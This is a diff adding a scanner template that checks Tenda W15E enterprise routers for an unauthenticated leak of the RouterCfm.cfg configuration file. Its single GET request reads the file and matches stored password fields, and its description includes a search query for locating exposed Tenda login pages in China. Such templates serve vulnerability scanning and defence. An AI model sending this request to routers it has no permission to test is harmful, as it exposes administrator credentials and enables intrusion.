@@ -1,0 +1,19 @@
+id: tenda-w15e-routercfm-cfg-config-leak
+
+info:
+  name: Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞
+  author: zan8in
+  severity: high
+  description: |
+    Tenda 企业级路由器 RouterCfm.cfg 配置文件可在未授权的情况下被读取，导致账号密码等敏感信息泄漏
+    title=="Tenda | Login" && country="CN"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/Tenda/Tenda%20W15E%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8%20RouterCfm.cfg%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/DownloadCfg/RouterCfm.cfg
+    expression: response.status == 200 && response.body.bcontains(b'sys.userpass=') && response.body.bcontains(b'sys.userpass.decode.pwd=')
+expression: r0()
